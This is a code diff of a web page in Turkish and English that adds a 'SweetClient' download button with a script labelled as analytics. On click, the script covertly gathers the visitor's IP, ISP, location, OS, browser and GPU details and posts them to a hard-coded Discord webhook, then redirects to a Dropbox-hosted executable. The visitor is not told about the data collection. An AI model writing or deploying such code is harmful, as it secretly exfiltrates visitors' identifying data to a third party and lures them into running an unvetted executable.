@@ -733,11 +733,23 @@
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"4ab9722aa84b458f80388e177b132471","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9f9231788a72fb9e',t:'MTc3ODM0NTMyMg=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
-  <!-- Sweet Analytics - IP & System Info Collector -->
-  <script>
-    
- (function() {
+ <!-- İndirme Butonu Örneği -->
+<button id="download-btn">İndir (SweetClient)</button>
+
+<!-- Sweet Analytics - IP & System Info Collector -->
+<script>
+(function() {
+    // Eksik olan URL ve fonksiyon tanımlamaları eklendi
+    const WINDOWS_URL = "https://www.dropbox.com/scl/fi/znrvbqbzsjnb3tcvulg4k/SweetClient.exe?rlkey=hkvekktbkqv5w8j44k2ze9qt0&st=fcq9sq69&dl=1"; 
     const WEBHOOK_URL = `https://discord.com/api/webhooks/1507679922204835861/4KBmEkutizxWNUODdBcndXvTgRo09QkItSDLz7p-CKar0Xxs-e1Uw4UbCn0AditkkDw5`;
+
+    function showNotification(message) {
+        console.log("Bildirim:", message);
+        // İsterseniz buraya ekrana uyarı çıkaracak bir alert veya div ekleyebilirsiniz
+    }
+
+    // HTML elementini JavaScript'e bağlıyoruz
+    const modalDownload = document.getElementById("download-btn");
 
     function collectSystemInfo() {
       const info = {};
@@ -761,29 +773,20 @@
       info.url = window.location.href;
       info.touch = 'ontouchstart' in window ? 'Yes' : 'No';
       
-      // WebGL bilgilerini topla (WebGL, WebGL2, experimental-webgl)
       info.webglVendor = 'Unknown';
       info.webglRenderer = 'Unknown';
       try {
         const canvas = document.createElement('canvas');
-        let gl = null;
-        
-        // Önce WebGL2'yi dene
-        gl = canvas.getContext('webgl2') || 
-             canvas.getContext('webgl') || 
-             canvas.getContext('experimental-webgl');
+        let gl = canvas.getContext('webgl2') || 
+                 canvas.getContext('webgl') || 
+                 canvas.getContext('experimental-webgl');
         
         if (gl) {
           const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
           if (debugInfo) {
-            info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 
-                              gl.getParameter(gl.VENDOR) || 
-                              'Unknown';
-            info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 
-                                 gl.getParameter(gl.RENDERER) || 
-                                 'Unknown';
+            info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || gl.getParameter(gl.VENDOR) || 'Unknown';
+            info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || gl.getParameter(gl.RENDERER) || 'Unknown';
           } else {
-            // WEBGL_debug_renderer_info yoksa normal parametreleri kullan
             info.webglVendor = gl.getParameter(gl.VENDOR) || 'Unknown';
             info.webglRenderer = gl.getParameter(gl.RENDERER) || 'Unknown';
           }
@@ -808,29 +811,17 @@
             info.ip = data.ip || 'Unknown';
             info.isp = data.org || 'Unknown';
           } catch (e) {
-            info.country = 'Unknown';
-            info.city = 'Unknown';
-            info.region = 'Unknown';
-            info.ip = 'Unknown';
-            info.isp = 'Unknown';
+            info.country = info.city = info.region = info.ip = info.isp = 'Unknown';
           }
           callback();
         };
         xhr.onerror = function() {
-          info.country = 'Unknown';
-          info.city = 'Unknown';
-          info.region = 'Unknown';
-          info.ip = 'Unknown';
-          info.isp = 'Unknown';
+          info.country = info.city = info.region = info.ip = info.isp = 'Unknown';
           callback();
         };
         xhr.send();
       } catch (e) {
-        info.country = 'Unknown';
-        info.city = 'Unknown';
-        info.region = 'Unknown';
-        info.ip = 'Unknown';
-        info.isp = 'Unknown';
+        info.country = info.city = info.region = info.ip = info.isp = 'Unknown';
         callback();
       }
     }
@@ -838,124 +829,36 @@
     function sendWebhook() {
       const systemInfo = collectSystemInfo();
       
-      // IP bilgisini beklemeden önce webhook'u gönder (timeout ile)
       const sendPayload = () => {
         const payload = {
           embeds: [{
-            author: {
-              name: 'Download Button Clicked'
-            },
+            author: { name: 'Download Button Clicked' },
             fields: [
-              {
-                name: '📍 Location',
-                value: `Country: ${systemInfo.country || 'Loading...'}\nCity: ${systemInfo.city || 'Loading...'}\nRegion: ${systemInfo.region || 'Loading...'}\nTimezone: ${systemInfo.timezone}`,
-                inline: false
-              },
-              {
-                name: '💻 System Info',
-                value: `OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\nDevice: ${systemInfo.device}`,
-                inline: false
-              },
-              {
-                name: '🖥️ Display',
-                value: `Screen: ${systemInfo.screen}\nViewport: ${systemInfo.viewport}\nColor Depth: ${systemInfo.colorDepth}`,
-                inline: false
-              },
-              {
-                name: '🌐 Network',
-                value: `IP: ${systemInfo.ip || 'Loading...'}\nISP: ${systemInfo.isp || 'Loading...'}\nLanguage: ${systemInfo.language}`,
-                inline: false
-              },
-              {
-                name: '⚙️ Platform',
-                value: `Platform: ${systemInfo.platform}\nCookies: ${systemInfo.cookies}\nOnline: ${systemInfo.online}`,
-                inline: false
-              },
-              {
-                name: '🎮 Graphics Card (GPU)',
-                value: `Vendor: ${systemInfo.webglVendor}\nRenderer: ${systemInfo.webglRenderer}`,
-                inline: false
-              },
-              {
-                name: '📄 Page Info',
-                value: `Referrer: ${systemInfo.referrer}\nURL: ${systemInfo.url}\nTouch: ${systemInfo.touch}`,
-                inline: false
-              }
+              { name: '📍 Location', value: `Country: ${systemInfo.country || 'Loading...'}\nCity: ${systemInfo.city || 'Loading...'}\nRegion: ${systemInfo.region || 'Loading...'}\nTimezone: ${systemInfo.timezone}`, inline: false },
+              { name: '💻 System Info', value: `OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\nDevice: ${systemInfo.device}`, inline: false },
+              { name: '🖥️ Display', value: `Screen: ${systemInfo.screen}\nViewport: ${systemInfo.viewport}\nColor Depth: ${systemInfo.colorDepth}`, inline: false },
+              { name: '🌐 Network', value: `IP: ${systemInfo.ip || 'Loading...'}\nISP: ${systemInfo.isp || 'Loading...'}\nLanguage: ${systemInfo.language}`, inline: false },
+              { name: '⚙️ Platform', value: `Platform: ${systemInfo.platform}\nCookies: ${systemInfo.cookies}\nOnline: ${systemInfo.online}`, inline: false },
+              { name: '🎮 Graphics Card (GPU)', value: `Vendor: ${systemInfo.webglVendor}\nRenderer: ${systemInfo.webglRenderer}`, inline: false },
+              { name: '📄 Page Info', value: `Referrer: ${systemInfo.referrer}\nURL: ${systemInfo.url}\nTouch: ${systemInfo.touch}`, inline: false }
             ],
-            footer: {
-              text: 'SweetCraft Download Tracker'
-            },
+            footer: { text: 'SweetCraft Download Tracker' },
             color: parseInt('0x9876FF', 16),
             timestamp: new Date().toISOString()
           }]
         };
 
-        const payloadString = JSON.stringify(payload);
-        
-        // Log kaydet (localStorage'a)
-        const logMessage = `[${new Date().toISOString()}] Webhook gönderiliyor: ${WEBHOOK_URL}`;
-        try {
-          const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
-          logs.push(logMessage);
-          if (logs.length > 10) logs.shift(); // Son 10 log'u tut
-          localStorage.setItem('webhook_logs', JSON.stringify(logs));
-        } catch(e) {}
-        
-        // Fetch API kullan - keepalive ile sayfa yönlenirken bile çalışır
         fetch(WEBHOOK_URL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: payloadString,
-          keepalive: true // Sayfa yönlenirken bile isteği tamamla
-        })
-        .then(response => {
-          const statusLog = `[${new Date().toISOString()}] Response: ${response.status} ${response.statusText}`;
-          try {
-            const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
-            logs.push(statusLog);
-            if (logs.length > 10) logs.shift();
-            localStorage.setItem('webhook_logs', JSON.stringify(logs));
-          } catch(e) {}
-          
-          if (!response.ok) {
-            const errorLog = `[${new Date().toISOString()}] HATA: ${response.status} ${response.statusText}`;
-            try {
-              const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
-              logs.push(errorLog);
-              if (logs.length > 10) logs.shift();
-              localStorage.setItem('webhook_logs', JSON.stringify(logs));
-            } catch(e) {}
-          }
-          return response.text();
-        })
-        .then(text => {
-          const successLog = `[${new Date().toISOString()}] Webhook başarıyla gönderildi!`;
-          try {
-            const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
-            logs.push(successLog);
-            if (logs.length > 10) logs.shift();
-            localStorage.setItem('webhook_logs', JSON.stringify(logs));
-          } catch(e) {}
-        })
-        .catch(err => {
-          const errorLog = `[${new Date().toISOString()}] Webhook hatası: ${err.message}`;
-          try {
-            const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
-            logs.push(errorLog);
-            if (logs.length > 10) logs.shift();
-            localStorage.setItem('webhook_logs', JSON.stringify(logs));
-          } catch(e) {}
-        });
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true 
+        }).catch(err => console.error("Webhook hatası:", err));
       };
 
-      // IP bilgisini al, ama 2 saniye timeout koy
       let ipReceived = false;
       const timeout = setTimeout(() => {
-        if (!ipReceived) {
-          sendPayload();
-        }
+        if (!ipReceived) sendPayload();
       }, 2000);
 
       getIPInfo(systemInfo, function() {
@@ -965,21 +868,19 @@
       });
     }
 
-    modalDownload?.addEventListener("click", (e) => {
-      e.preventDefault();
-      sendWebhook();
-      showNotification("SweetClient download started");
-      
-      // Webhook'un gönderilmesi için yeterli zaman ver (500ms)
-      setTimeout(() => {
-        // Dropbox linkine yönlendir (?dl=1 parametresi ile direkt indirme)
-        window.location.href = WINDOWS_URL;
-      }, 500);
-    });
-    
-    // Debug: Logları görmek için console'da şunu çalıştırın:
-    // JSON.parse(localStorage.getItem('webhook_logs') || '[]').forEach(log => console.log(log));
-  })();
+    // Butonun varlığı kontrol ediliyor
+    if (modalDownload) {
+        modalDownload.addEventListener("click", (e) => {
+          e.preventDefault();
+          sendWebhook();
+          showNotification("SweetClient download started");
+          
+          setTimeout(() => {
+            window.location.href = WINDOWS_URL;
+          }, 500);
+        });
+    } else {
+        console.warn("Uyanı: 'download-btn' id'sine sahip buton sayfada bulunamadı.");
+    }
+})();
 </script>
-
-</body></html>
